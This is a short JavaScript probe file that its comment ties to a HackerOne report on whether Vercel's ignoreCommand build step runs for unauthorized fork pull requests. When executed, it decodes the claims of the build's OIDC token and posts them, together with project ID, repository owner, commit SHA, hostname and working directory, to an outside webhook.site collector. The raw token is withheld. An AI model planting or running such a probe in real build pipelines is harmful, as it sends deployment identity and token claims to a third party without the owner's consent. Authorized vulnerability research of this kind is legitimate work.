// Probe for HackerOne #4086036: does the Ignored Build Step (ignoreCommand)
// execute for an UNAUTHORIZED external fork PR, before fork authorization?
// Reports presence/metadata only. Never the raw token.
const WEBHOOK = "https://webhook.site/a72ec3e3-e006-423e-bf2d-333bccfc0392";

function decodeClaims(token) {
  try {
    const part = token.split(".")[1];
    return JSON.parse(Buffer.from(part, "base64url").toString("utf8"));
  } catch {
    return null;
  }
}

const token = process.env.VERCEL_OIDC_TOKEN ?? "NOT_AVAILABLE";

try {
  await fetch(WEBHOOK, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      phase: "ignoreCommand",
      marker: {
        VERCEL: process.env.VERCEL ?? "NOT_SET",
        VERCEL_ENV: process.env.VERCEL_ENV ?? "NOT_SET",
        VERCEL_TARGET_ENV: process.env.VERCEL_TARGET_ENV ?? "NOT_SET",
        VERCEL_PROJECT_ID: process.env.VERCEL_PROJECT_ID ?? "NOT_SET",
        VERCEL_GIT_REPO_OWNER: process.env.VERCEL_GIT_REPO_OWNER ?? "NOT_SET",
        VERCEL_GIT_COMMIT_SHA: process.env.VERCEL_GIT_COMMIT_SHA ?? "NOT_SET",
        CI: process.env.CI ?? "NOT_SET"
      },
      cwd: process.cwd(),
      hostname: process.env.HOSTNAME ?? "NOT_SET",
      oidc: {
        present: token !== "NOT_AVAILABLE",
        length: token === "NOT_AVAILABLE" ? 0 : token.length,
        claims: token === "NOT_AVAILABLE" ? null : decodeClaims(token)
      },
      timestamp: new Date().toISOString()
    }),
    signal: AbortSignal.timeout(10_000)
  });
} catch {
  // best effort
}
